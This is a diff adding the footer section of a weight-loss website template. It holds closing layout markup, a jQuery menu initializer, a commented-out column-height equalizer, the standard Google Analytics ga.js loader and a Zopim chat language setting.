+              <div id="gotop"><p><a href="#vtem" title="Back to Top"><span>Go Top</span></a></p></div>                 </div> 
+                      <div class="clr"></div>
+             
+           </div>
+       </div>  
+     </div>     
+  </div>    
+  </div>     
+</div>  
+<script type="text/javascript" src="/templates/vt_weightloss/vtemtools/menus/fg.menu.js"></script>
+<script type="text/javascript">
+var vtemdrilldownm = jQuery.noConflict();jQuery(document).ready(function(){jQuery("#vtflatmenu").menu({content: jQuery("#vtflatmenu").next().html(),crumbDefaultText: ""});});
+
+////////////////EQUA COLUNMS /////////////////
+var Equalizer = new Class({
+initialize: function(elements) {
+this.elements = $$(elements);
+},
+equalize: function(hw) {
+if(!hw) { hw = 'height'; }
+var max = 0,
+prop = (typeof document.body.style.maxHeight != 'undefined' ? 'min-' : '') + hw; //ie6 ftl
+offset = 'offset' + hw.capitalize();
+this.elements.each(function(element,i) {
+var calc = element[offset];
+if(calc > max) { max = calc; }
+},this);
+this.elements.each(function(element,i) {
+element.setStyle(prop,max - (element[offset] - element.getStyle(hw).toInt()));
+});
+return max;
+}
+});
+///////////////////////////////////////////////////////////////
+/*
+function fixHeight1 () {
+var equalizer1 = new Equalizer("#vt_main_inside .vt_auto_cols").equalize("height");
+}
+window.addEvent ("load", function () {
+fixHeight1.delay (300);
+}); 
+*/
+</script>
+<script type="text/javascript">
+			var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+			document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+			</script>
+			<script type="text/javascript">
+			try {
+			var pageTracker = _gat._getTracker("UA-46323428-1");
+			pageTracker._trackPageview();
+			} catch(err) {}</script>
+			
+<script type="text/javascript">$zopim(function() { $zopim.livechat.setLanguage('en'); });</script></body>
+</html>
